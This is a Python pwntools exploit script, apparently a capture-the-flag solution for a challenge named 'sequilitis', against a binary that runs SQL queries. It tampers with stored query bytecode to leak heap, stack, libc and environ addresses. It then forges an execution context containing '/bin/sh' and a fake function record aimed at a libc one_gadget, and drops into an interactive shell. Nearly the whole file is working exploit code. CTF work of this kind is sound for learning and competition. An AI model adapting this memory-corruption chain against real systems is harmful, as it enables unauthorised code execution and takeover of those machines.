#!/usr/bin/env python3

from pwn import *

exe = ELF("chal_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        #if args.DEBUG:
        #    gdb.attach(r)
    else:
        r = remote("sequilitis.chal.irisc.tf", 10000)

    return r

r = conn()

sa   = lambda a,b : r.sendafter(a,b)
sla  = lambda a,b : r.sendlineafter(a,b)
sd   = lambda a,b : r.send(a,b)
sl   = lambda a : r.sendline(a)
ru   = lambda a : r.recvuntil(a, drop=True)
rc   = lambda : r.recv(4096)
uu32 = lambda data : u32(data.ljust(4, b'\0'))
uu64 = lambda data : u64(data.ljust(8, b'\0'))

script = """
breakrva 0x8a36
break system
"""

def new_query(idx, payload):
    sla(':', '1');
    sla('?', f'{idx}');
    sla(':', payload);

def edit_query(idx, count, payload):
    sla(':', '5');
    sla('?', f'{idx}');
    sla('?', f'{count}');
    sla(":", payload); #registered as ints im pretty sure

def exec_query(idx):
    sla(":", '2')
    sla("?", f'{idx}')

def del_query(idx):
    sla(":", '3')
    sla("?", f'{idx}')


#0x556813c6c098: 0x0000000000000008      0x0000000000000009
#0x556813c6c0a8: 0x0000000000000000      0x000000000000fd70
#0x556813c6c0b8: 0x0000000000000002      0x0000000000000003

heap_off = 0xE4D8
stack_heap = 0x8F00
libc = 0x2e0
libc_off = 0x219CF0
As_offset = 0xCAC8

blob = b"\x4d\x00\x00\x00" #size, dst reg, p64(0), append blob address
int64 = b"\x48\xf3\x00\x00\x00\x00\x00\x00" #append reg and int address
copy = b"\x80\x00\x00\x00" #append p1 src, p2 dst, p3 size + p64(0)

def main():
    payload = b""
    payload += b"\x08\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00"
    payload += b"\x00\x00\x00\x00\x00\x00\x00\x00\x48\xf3\x00\x00\x00\x00\x00\x00"
    payload += b"\x01\x00\x00\x00\x00\x00\x00\x00" #manip the end of the large int ptr

    new_query(1, "create table dummy(a,b,c,id);")
    exec_query(1)
    new_query(5, 'insert into dummy(a,b,c,id) values(1,1,2,1);')
    exec_query(5)
    new_query(3, "create view lol(lol1, lol2,lol3,lol4) as select * from dummy;")
    exec_query(3)
    new_query(2, "select 4294967296;")
    new_query(4, "select * from lol;")
    edit_query(2,len(payload)+1,payload+b"\x88")
    exec_query(2)
    heap = int(r.recvline().strip()) - heap_off
    log.info(f"HEAP: {hex(heap)}")

    edit_query(2,len(payload)+8,payload+p64(heap + stack_heap))
    exec_query(2)
    stack = int(r.recvline().strip())
    log.info(f"STACK: {hex(stack)}")


    new_query(6, "create table dummy2(a,b,c,id);");
    exec_query(6)
    new_query(7, 'insert into dummy2(a,b,c,id) values(1,1,2,1);')
    exec_query(7)
    del_query(7)
    new_query(7, 'insert into dummy(a,b,c,id) VALUES(280267669825,280267669825,280267669825,2);')
    exec_query(7)
    del_query(7)
    new_query(7, 'insert into dummy2(a,b,c,id) VALUES(284579480130,284579480130,284579480130,2);')
    exec_query(7)
    del_query(7)
    new_query(7, 'select dummy.a, dummy.b, dummy2.c from dummy inner join dummy2 on dummy.c=dummy2.c;')

    edit_query(2,len(payload)+8,payload+p64(heap + libc))
    exec_query(2)
    libc_base = int(r.recvline().strip()) - libc_off
    log.info(f"LIBC: {hex(libc_base)}")
    edit_query(2,len(payload)+8,payload+p64(libc_base + 0x221200))
    exec_query(2)
    environ = int(r.recvline().strip())
    log.info(f"environ: {hex(environ)}")

    system = libc_base + 0x50D70
    one_gadget = libc_base + 0xebc88

    write_offset = 0x8668
    dirty_ctx_off = 0xf0
    dirty_func_off = 0x140
    dirty_func_addr = write_offset + heap + dirty_func_off
    #forge a ctx
    dirty_ctx = b"/bin/sh\x00" + p64(dirty_func_addr) + b"\x00"*0x20 + p64(environ)

    #forge a call to one gadget
    dirty_func = p64(0x1) + p64(0) + p64(0) + p64(one_gadget) + p64(0) + p64(0)

    trigger = b"\x08\x00\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x00\x00\x00\x00"
    trigger += b"\x00\x00\x00\x00\x00\x00\x00\x00\x0f\x00\x00\x00\x00\x00\x00\x00"
    trigger += b"\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    trigger += b"\x75\xfa\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00"
    trigger += p64(heap + 0x2000)
    trigger += b"\x75\xfa\x00\x00\x00\x00\x00\x00"
    trigger += b"\x03\x00\x00\x00\x00\x00\x00\x00"
    trigger += p64(heap + 0x3000)
    trigger += b"\x42\xf1\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00"
    trigger += p64(heap+write_offset+dirty_ctx_off)
    trigger += b"\x11\x00\x00\x00\x01\x00\x00\x00"
    trigger += b"\x08\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    trigger += b"\x75\xfa\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00"
    trigger += b"\xc8\x6d\xff\x9b\xb6\x55\x00\x00\x54\x00\x00\x00\x04\x00\x00\x00"
    trigger += b"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    trigger += b"\x46\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    trigger += b"\x00\x00\x00\x00\x00\x00\x00\x00"
    trigger += b"\x09\x00\x00\x00\x00\x00\x00\x00"
    trigger += b"\x01\x00\x00\x00\x00\x00\x00\x00"
    trigger += b"\x00\x00\x00\x00\x00\x00\x00\x00"
    trigger += dirty_ctx
    trigger += b"\x00" *0x18
    trigger += dirty_func
    trigger += b"\x00" *0x40

    #gdb.attach(r,gdbscript=f"break *{hex(one_gadget)}")
    edit_query(7,len(trigger),trigger)
    exec_query(7)

    #edit_query(6,len(dirty_ctx),dirty_ctx) #to catch the debugger
    #edit_query(7,len(dirty_func),dirty_func) #to catch the debugger
    r.interactive()


if __name__ == "__main__":
    main()

